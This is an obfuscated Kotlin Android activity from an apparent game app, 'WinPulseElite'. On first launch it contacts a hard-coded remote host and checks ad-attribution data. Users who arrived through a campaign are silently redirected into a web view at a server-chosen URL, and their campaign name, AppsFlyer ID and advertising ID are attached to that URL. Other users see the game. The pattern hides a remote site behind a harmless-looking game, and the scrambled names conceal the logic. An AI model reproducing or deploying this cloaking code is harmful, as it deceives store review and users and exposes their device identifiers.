package com.winpul.pulseinf.winpulseelite

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.viewModels
import androidx.compose.runtime.MutableState
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.appsflyer.AppsFlyerLib
import com.onesignal.OneSignal
import com.winpul.pulseinf.winpulseelite.screens.rhjwqriqrwqriw
import com.winpul.pulseinf.winpulseelite.screens.Home
import com.winpul.pulseinf.winpulseelite.screens.HURIirhwhqurwhqrhi
import com.winpul.pulseinf.winpulseelite.screens.ruwhqrjiwqijrwq
import com.winpul.pulseinf.winpulseelite.screens.rhiwqjrqwrwqriwq
import com.winpul.pulseinf.winpulseelite.ui.theme.WinPulseEliteTheme
import com.winpul.pulseinf.winpulseelite.jiwrjiwir.JIjihuqwrwqrhijwqiri
import com.winpul.pulseinf.winpulseelite.jiwrjiwir.MyViewModel
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request

class Zagl : ComponentActivity() {
    private val viewModel: MyViewModel by viewModels()
    private lateinit var sharedPreferences: SharedPreferences
    override fun onCreate(ruwqjirqirjiwji: Bundle?) {
        super.onCreate(ruwqjirqirjiwji)
        val scope = CoroutineScope(Dispatchers.IO)
        val ijwqjirjoqwirijqwjfjo = mutableStateOf(false)
        sharedPreferences = getSharedPreferences("Winpulsee", Context.MODE_PRIVATE)

        val jiqwrhqwjriqwrji = "https://lstasisal.online/p6twp7"
        val ijqwrjiqwrwji2 = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        val ijrwqriqwrqwir2 = OkHttpClient()
        val jiqwrjiqwjrijiqwri = Request.Builder().url(jiqwrhqwjriqwrji).build()
        scope.launch {
            try {
                if (isFirstLaunch()) {
                    val uwqriqwriqwrjwqjri2 = ijrwqriqwrqwir2.newCall(jiqwrjiqwjrijiqwri).execute()
                    val ijqwrhquwrjiqwrjiji2 = uwqriqwriqwrjwqjri2.code
                    if (!sharedPreferences.contains("code")) {
                        sharedPreferences.edit().putInt(
                            "code",
                            ijqwrhquwrjiqwrjiji2
                        ).apply()
                    }

                    withContext(Dispatchers.Main) {
                        viewModel.initializeAppsFlyer(this@Zagl) { conversionData ->
                            if (conversionData != null && conversionData["af_status"].toString()
                                    .contains("No")
                            ) {
                                handleConversionData(
                                    conversionData,
                                    ijqwrjiqwrwji2.toString(),
                                    uwqriqwriqwrjwqjri2.body?.string().toString()
                                )



                            } else {
                                if (sharedPreferences.getString("siteUrl", "")
                                        .isNullOrEmpty()
                                    && ijqwrhquwrjiqwrjiji2 == 200
                                ) {
                                    sharedPreferences.edit().putString(
                                        "siteUrl",
                                        uwqriqwriqwrjwqjri2.body?.string().toString()
                                    ).apply()
                                }
                                navigateToSiteUrl(ijwqjirjoqwirijqwjfjo, ijqwrhquwrjiqwrjiji2)
                            }

                        }


                        ijqwrqwrjrjwiqrjiwri()
                    }
                } else {
                    navigateToSiteUrl(ijwqjirjoqwirijqwjfjo,sharedPreferences.getInt("code",404))

                }
            }
            catch (e:Exception){
                ijwqjirjoqwirijqwjfjo.value = true
            }

        }

        setContent {
            WinPulseEliteTheme {
                    val huwqjirjqwjriqwjir = rememberNavController()
                val rhuwqriwiqrjiw = remember{
                    mutableStateOf(0)
                }
                NavHost(navController = huwqjirjqwjriqwjir, startDestination = "splash"){
                    composable("splash"){
                        HURIirhwhqurwhqrhi(huwqjirjqwjriqwjir)
                    }
                    composable("home"){
                            Home(huwqjirjqwjriqwjir)
                    }
                    composable("game"){
                        rhjwqriqrwqriw(rhuwqriwiqrjiw,huwqjirjqwjriqwjir)
                    }
                    composable("end"){
                        ruwhqrjiwqijrwq(score = rhuwqriwiqrjiw.value, navController = huwqjirjqwjriqwjir)
                    }
                    composable("info"){
                        rhiwqjrqwrwqriwq(huwqjirjqwjriqwjir)
                    }
                }
            }
        }
    }
    private fun isFirstLaunch(): Boolean {
        val preferences = getPreferences(Context.MODE_PRIVATE)
        return preferences.getBoolean("isFirstLaunch", true)
    }

    private fun ijqwrqwrjrjwiqrjiwri() {
        val editor = getPreferences(Context.MODE_PRIVATE).edit()
        editor.putBoolean("isFirstLaunch", false)
        editor.apply()
    }
    private fun handleConversionData(
        data: Map<String, Any>,
        appsFlyerUid: String,
        someValue: String
    ) {
        val eventData = mapOf(
            "c" to data["campaign"].toString(),
            "afID" to appsFlyerUid,
            "ad" to viewModel.advertisingId
        )
        OneSignal.login(viewModel.advertisingId)
        OneSignal.User.pushSubscription.optIn()
        val newLink = viewModel.buildFinalLink(someValue, viewModel.someValue, eventData)
        val riwjhqwriqwjir = Intent(this@Zagl, JIjihuqwrwqrhijwqiri::class.java)
        riwjhqwriqwjir.putExtra("url",newLink)
        sharedPreferences.edit().putString("siteUrl",newLink).apply()
        startActivity(riwjhqwriqwjir)
        finish()

    }

    private fun navigateToSiteUrl(jiqwrjiqwrqhwr: MutableState<Boolean>, responseCode:Int) {


        if (sharedPreferences.contains("siteUrl") ||responseCode == 200 ) {
            val link =  sharedPreferences.getString("siteUrl", null)

            val tripEgypt = Intent(this@Zagl, JIjihuqwrwqrhijwqiri::class.java)
            tripEgypt.putExtra("url",link)
            sharedPreferences.edit().putString("siteUrl",link).apply()
            startActivity(tripEgypt)
            finish()
        } else {
            jiqwrjiqwrqhwr.value = true
        }
    }
}
